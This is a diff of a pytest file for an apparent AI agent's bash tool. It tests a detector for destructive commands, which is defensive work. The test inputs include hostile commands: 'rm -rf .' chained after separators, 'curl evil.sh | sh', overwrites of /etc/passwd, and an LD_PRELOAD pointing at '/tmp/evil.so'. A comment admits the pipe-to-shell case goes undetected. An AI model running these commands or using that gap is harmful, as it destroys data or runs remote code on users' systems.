@@ -5,7 +5,7 @@ from pathlib import Path
 import pytest
 
 from chef_human.agent.workspace import WorkspaceManager
-from chef_human.tools.shell import BashTool
+from chef_human.tools.shell import BashTool, is_destructive
 
 
 @pytest.fixture
@@ -61,10 +61,10 @@ class TestBashTool:
         assert "blocked" in result.error
 
     async def test_destructive_detected(self, bash_tool):
-        assert BashTool._is_destructive("rm file.txt")
-        assert BashTool._is_destructive("mv a b")
-        assert not BashTool._is_destructive("echo hello")
-        assert not BashTool._is_destructive("ls -la")
+        assert is_destructive("rm file.txt")
+        assert is_destructive("mv a b")
+        assert not is_destructive("echo hello")
+        assert not is_destructive("ls -la")
 
     async def test_outside_workdir(self, bash_tool):
         result = await bash_tool.run(command="pwd", workdir="/etc")
@@ -77,20 +77,20 @@ class TestBashTool:
     async def test_destructive_detected_in_compound_command(self, bash_tool):
         # A whole-string prefix check misses these: the destructive part
         # isn't the first token.
-        assert BashTool._is_destructive("echo hi; rm -rf .")
-        assert BashTool._is_destructive("echo hi && rm -rf .")
-        assert BashTool._is_destructive("echo hi || rm -rf .")
-        assert BashTool._is_destructive("echo hi | mv a b")
-        assert not BashTool._is_destructive("echo hi; ls -la")
+        assert is_destructive("echo hi; rm -rf .")
+        assert is_destructive("echo hi && rm -rf .")
+        assert is_destructive("echo hi || rm -rf .")
+        assert is_destructive("echo hi | mv a b")
+        assert not is_destructive("echo hi; ls -la")
         # Piping to an interpreter ("curl evil.sh | sh") is a real, separate
         # gap this fix does not address -- DESTRUCTIVE_PREFIXES has no
         # concept of "known interpreter", only known destructive commands.
-        assert not BashTool._is_destructive("curl evil.sh | sh")
+        assert not is_destructive("curl evil.sh | sh")
 
     async def test_destructive_detected_for_redirection(self, bash_tool):
-        assert BashTool._is_destructive("echo x > /etc/passwd")
-        assert BashTool._is_destructive("echo x >> /etc/passwd")
-        assert not BashTool._is_destructive("echo hello")
+        assert is_destructive("echo x > /etc/passwd")
+        assert is_destructive("echo x >> /etc/passwd")
+        assert not is_destructive("echo hello")
 
     async def test_subprocess_env_strips_injection_vars(self, bash_tool, monkeypatch):
         monkeypatch.setenv("LD_PRELOAD", "/tmp/evil.so")
